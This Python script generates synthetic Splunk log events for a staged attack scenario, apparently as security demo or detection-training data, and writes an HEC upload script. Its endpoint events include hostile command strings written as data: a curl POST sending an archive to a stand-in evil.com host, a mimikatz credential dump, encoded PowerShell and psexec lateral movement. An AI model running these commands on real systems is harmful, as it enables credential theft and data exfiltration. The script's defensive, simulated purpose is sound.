"""
Attack Scenario Generator — Generates realistic security event data for Splunk.

This script creates a multi-stage attack scenario:
1. Brute force login attempts
2. Successful credential compromise
3. Lateral movement to multiple hosts
4. Data exfiltration

Run this script to populate your Splunk instance with demo data.
Usage: python attack_scenario.py
"""

import json
import random
import os
from datetime import datetime, timedelta
from pathlib import Path

# Configuration
OUTPUT_DIR = Path(__file__).parent.parent / "sample_data"
OUTPUT_DIR.mkdir(exist_ok=True)

# Attack scenario parameters
ATTACKER_IP = "203.0.113.42"
VICTIM_USER = "jsmith"
VICTIM_WORKSTATION = "WKS-JSMITH-01"
INTERNAL_SERVERS = ["SRV-DC01", "SRV-FILE01", "SRV-DB01", "SRV-WEB01"]
EXFIL_DEST_IP = "198.51.100.77"
EXFIL_DOMAIN = "cdn-updates.evil.com"
NORMAL_USERS = ["admin", "bwilson", "cmartinez", "djohnson", "elee", "fgarcia"]
NORMAL_IPS = ["10.0.1.10", "10.0.1.11", "10.0.1.12", "10.0.1.15", "10.0.2.20"]

# Timeline: Attack starts 6 hours ago
ATTACK_START = datetime.utcnow() - timedelta(hours=6)


def generate_auth_events():
    """Generate authentication events (Windows Security Events 4624/4625)."""
    events = []

    # Normal background auth events (24 hours of normal activity)
    base_time = datetime.utcnow() - timedelta(hours=24)
    for i in range(200):
        t = base_time + timedelta(minutes=random.randint(0, 1440))
        events.append({
            "_time": t.isoformat(),
            "index": "auth",
            "sourcetype": "WinEventLog:Security",
            "EventCode": "4624",
            "action": "success",
            "user": random.choice(NORMAL_USERS),
            "src_ip": random.choice(NORMAL_IPS),
            "dest": random.choice(INTERNAL_SERVERS + [VICTIM_WORKSTATION]),
            "LogonType": random.choice(["2", "3", "10"]),
            "app": "Windows",
        })

    # Phase 1: Brute force (500 failed attempts over 30 minutes)
    print("Generating Phase 1: Brute Force...")
    brute_start = ATTACK_START
    for i in range(500):
        t = brute_start + timedelta(seconds=random.randint(0, 1800))
        events.append({
            "_time": t.isoformat(),
            "index": "auth",
            "sourcetype": "WinEventLog:Security",
            "EventCode": "4625",
            "action": "failure",
            "user": VICTIM_USER,
            "src_ip": ATTACKER_IP,
            "dest": VICTIM_WORKSTATION,
            "LogonType": "10",
            "FailureReason": "%%2313",  # Unknown user name or bad password
            "app": "Windows",
        })

    # Phase 2: Successful compromise
    print("Generating Phase 2: Credential Compromise...")
    compromise_time = ATTACK_START + timedelta(minutes=35)
    events.append({
        "_time": compromise_time.isoformat(),
        "index": "auth",
        "sourcetype": "WinEventLog:Security",
        "EventCode": "4624",
        "action": "success",
        "user": VICTIM_USER,
        "src_ip": ATTACKER_IP,
        "dest": VICTIM_WORKSTATION,
        "LogonType": "10",
        "app": "Windows",
    })

    # Phase 3: Lateral movement (login to multiple servers)
    print("Generating Phase 3: Lateral Movement...")
    lateral_start = compromise_time + timedelta(minutes=10)
    for i, server in enumerate(INTERNAL_SERVERS):
        t = lateral_start + timedelta(minutes=i * 5)
        events.append({
            "_time": t.isoformat(),
            "index": "auth",
            "sourcetype": "WinEventLog:Security",
            "EventCode": "4624",
            "action": "success",
            "user": VICTIM_USER,
            "src_ip": "10.0.1.50",  # Victim workstation internal IP
            "dest": server,
            "LogonType": "3",
            "app": "Windows",
        })

    return sorted(events, key=lambda x: x["_time"])


def generate_network_events():
    """Generate network traffic events (firewall/proxy logs)."""
    events = []

    # Normal background traffic
    base_time = datetime.utcnow() - timedelta(hours=24)
    for i in range(300):
        t = base_time + timedelta(minutes=random.randint(0, 1440))
        events.append({
            "_time": t.isoformat(),
            "index": "network",
            "sourcetype": "firewall",
            "action": "allowed",
            "src_ip": random.choice(NORMAL_IPS + ["10.0.1.50"]),
            "dest_ip": f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "dest_port": random.choice([80, 443, 8080, 53]),
            "bytes_out": random.randint(100, 50000),
            "bytes_in": random.randint(100, 100000),
            "protocol": "TCP",
            "direction": "outbound",
        })

    # Phase 4: Data exfiltration (large outbound transfers)
    print("Generating Phase 4: Data Exfiltration...")
    exfil_start = ATTACK_START + timedelta(hours=1, minutes=30)
    for i in range(50):
        t = exfil_start + timedelta(minutes=random.randint(0, 60))
        events.append({
            "_time": t.isoformat(),
            "index": "network",
            "sourcetype": "firewall",
            "action": "allowed",
            "src_ip": "10.0.1.50",
            "dest_ip": EXFIL_DEST_IP,
            "dest_port": 443,
            "bytes_out": random.randint(500000, 5000000),  # Large transfers
            "bytes_in": random.randint(100, 1000),
            "protocol": "TCP",
            "direction": "outbound",
        })

    # Attacker initial connection
    for i in range(20):
        t = ATTACK_START + timedelta(seconds=random.randint(0, 1800))
        events.append({
            "_time": t.isoformat(),
            "index": "network",
            "sourcetype": "firewall",
            "action": "allowed",
            "src_ip": ATTACKER_IP,
            "dest_ip": "10.0.1.50",
            "dest_port": 3389,  # RDP
            "bytes_out": random.randint(1000, 10000),
            "bytes_in": random.randint(1000, 10000),
            "protocol": "TCP",
            "direction": "inbound",
        })

    return sorted(events, key=lambda x: x["_time"])


def generate_dns_events():
    """Generate DNS query logs."""
    events = []

    # Normal DNS queries
    normal_domains = [
        "google.com", "microsoft.com", "github.com", "slack.com",
        "office365.com", "aws.amazon.com", "splunk.com", "zoom.us",
    ]

    base_time = datetime.utcnow() - timedelta(hours=24)
    for i in range(400):
        t = base_time + timedelta(minutes=random.randint(0, 1440))
        events.append({
            "_time": t.isoformat(),
            "index": "dns",
            "sourcetype": "dns",
            "src_ip": random.choice(NORMAL_IPS + ["10.0.1.50"]),
            "query": random.choice(normal_domains),
            "query_type": "A",
            "reply_code": "NOERROR",
            "answer": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        })

    # Suspicious DNS queries during attack
    suspicious_domains = [
        EXFIL_DOMAIN,
        "c2-relay.evil.com",
        "update-service.suspicious.net",
    ]

    dns_start = ATTACK_START + timedelta(minutes=40)
    for i in range(30):
        t = dns_start + timedelta(minutes=random.randint(0, 120))
        events.append({
            "_time": t.isoformat(),
            "index": "dns",
            "sourcetype": "dns",
            "src_ip": "10.0.1.50",
            "query": random.choice(suspicious_domains),
            "query_type": random.choice(["A", "TXT"]),  # TXT for data exfil
            "reply_code": "NOERROR",
            "answer": EXFIL_DEST_IP,
        })

    return sorted(events, key=lambda x: x["_time"])


def generate_endpoint_events():
    """Generate endpoint/process creation events."""
    events = []

    # Normal processes
    normal_processes = [
        "explorer.exe", "chrome.exe", "outlook.exe", "teams.exe",
        "code.exe", "svchost.exe", "lsass.exe", "csrss.exe",
    ]

    base_time = datetime.utcnow() - timedelta(hours=24)
    for i in range(150):
        t = base_time + timedelta(minutes=random.randint(0, 1440))
        events.append({
            "_time": t.isoformat(),
            "index": "endpoint",
            "sourcetype": "endpoint",
            "event_type": "process_creation",
            "host": random.choice(INTERNAL_SERVERS + [VICTIM_WORKSTATION]),
            "user": random.choice(NORMAL_USERS),
            "process_name": random.choice(normal_processes),
            "parent_process": "explorer.exe",
            "command_line": f"C:\\Windows\\System32\\{random.choice(normal_processes)}",
        })

    # Suspicious processes during attack
    suspicious_processes = [
        {"process": "powershell.exe", "cmd": "powershell -enc SQBFAFgA..."},
        {"process": "cmd.exe", "cmd": "cmd.exe /c whoami /all"},
        {"process": "net.exe", "cmd": "net user /domain"},
        {"process": "mimikatz.exe", "cmd": "mimikatz.exe sekurlsa::logonpasswords"},
        {"process": "psexec.exe", "cmd": "psexec.exe \\\\SRV-FILE01 cmd.exe"},
        {"process": "7z.exe", "cmd": "7z.exe a -p exfil.7z C:\\Confidential\\*"},
        {"process": "curl.exe", "cmd": f"curl.exe -X POST https://{EXFIL_DOMAIN}/upload -d @exfil.7z"},
    ]

    attack_time = ATTACK_START + timedelta(minutes=40)
    for i, proc in enumerate(suspicious_processes):
        t = attack_time + timedelta(minutes=i * 8)
        events.append({
            "_time": t.isoformat(),
            "index": "endpoint",
            "sourcetype": "endpoint",
            "event_type": "process_creation",
            "host": VICTIM_WORKSTATION if i < 4 else "SRV-FILE01",
            "user": VICTIM_USER,
            "process_name": proc["process"],
            "parent_process": "cmd.exe",
            "command_line": proc["cmd"],
        })

    # File access events during exfiltration
    sensitive_files = [
        "C:\\Confidential\\financials_2026.xlsx",
        "C:\\Confidential\\customer_data.csv",
        "C:\\Confidential\\source_code.zip",
        "C:\\Confidential\\passwords.kdbx",
    ]

    file_access_time = ATTACK_START + timedelta(hours=1, minutes=10)
    for i, f in enumerate(sensitive_files):
        t = file_access_time + timedelta(minutes=i * 2)
        events.append({
            "_time": t.isoformat(),
            "index": "endpoint",
            "sourcetype": "endpoint",
            "event_type": "file_access",
            "host": "SRV-FILE01",
            "user": VICTIM_USER,
            "file_path": f,
            "action": "read",
            "bytes_read": random.randint(100000, 10000000),
        })

    return sorted(events, key=lambda x: x["_time"])


def save_events(events, filename):
    """Save events to JSON file."""
    filepath = OUTPUT_DIR / filename
    with open(filepath, "w") as f:
        json.dump(events, f, indent=2, default=str)
    print(f"  Saved {len(events)} events to {filepath}")


def generate_splunk_upload_script():
    """Generate a script to upload data to Splunk via HEC."""
    script = '''#!/bin/bash
# Upload sample data to Splunk via HTTP Event Collector (HEC)
# Make sure HEC is enabled on your Splunk instance
# Default HEC port: 8088

SPLUNK_HEC_URL="${SPLUNK_HEC_URL:-https://localhost:8088}"
SPLUNK_HEC_TOKEN="${SPLUNK_HEC_TOKEN:-your-hec-token}"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
DATA_DIR="$SCRIPT_DIR/../sample_data"

echo "Uploading sample data to Splunk..."
echo "HEC URL: $SPLUNK_HEC_URL"

for file in "$DATA_DIR"/*.json; do
    filename=$(basename "$file")
    echo "Uploading $filename..."
    
    # Read JSON array and send each event
    python3 -c "
import json, requests, urllib3
urllib3.disable_warnings()

with open('$file') as f:
    events = json.load(f)

for event in events:
    index = event.pop('index', 'main')
    sourcetype = event.pop('sourcetype', 'json')
    payload = {
        'index': index,
        'sourcetype': sourcetype,
        'event': event
    }
    try:
        resp = requests.post(
            '$SPLUNK_HEC_URL/services/collector/event',
            headers={'Authorization': 'Splunk $SPLUNK_HEC_TOKEN'},
            json=payload,
            verify=False
        )
    except Exception as e:
        pass

print(f'  Uploaded {len(events)} events from $filename')
"
done

echo "Done! Data should now be searchable in Splunk."
'''
    script_path = OUTPUT_DIR.parent / "eventgen" / "upload_to_splunk.sh"
    with open(script_path, "w") as f:
        f.write(script)
    os.chmod(script_path, 0o755)
    print(f"  Generated upload script: {script_path}")


if __name__ == "__main__":
    print("=" * 60)
    print("SentinelFlow — Attack Scenario Data Generator")
    print("=" * 60)
    print(f"\nAttack timeline starts at: {ATTACK_START.isoformat()}")
    print(f"Attacker IP: {ATTACKER_IP}")
    print(f"Victim: {VICTIM_USER} @ {VICTIM_WORKSTATION}")
    print(f"Exfil destination: {EXFIL_DEST_IP} ({EXFIL_DOMAIN})")
    print()

    print("Generating authentication events...")
    auth_events = generate_auth_events()
    save_events(auth_events, "auth_events.json")

    print("Generating network traffic events...")
    network_events = generate_network_events()
    save_events(network_events, "network_traffic.json")

    print("Generating DNS events...")
    dns_events = generate_dns_events()
    save_events(dns_events, "dns_queries.json")

    print("Generating endpoint events...")
    endpoint_events = generate_endpoint_events()
    save_events(endpoint_events, "endpoint_logs.json")

    print("\nGenerating Splunk upload script...")
    generate_splunk_upload_script()

    total = len(auth_events) + len(network_events) + len(dns_events) + len(endpoint_events)
    print(f"\n{'=' * 60}")
    print(f"Total events generated: {total}")
    print(f"Output directory: {OUTPUT_DIR}")
    print(f"\nNext steps:")
    print(f"  1. Enable HEC on your Splunk instance")
    print(f"  2. Create indexes: auth, network, dns, endpoint")
    print(f"  3. Run: cd splunk/eventgen && bash upload_to_splunk.sh")
    print(f"{'=' * 60}")
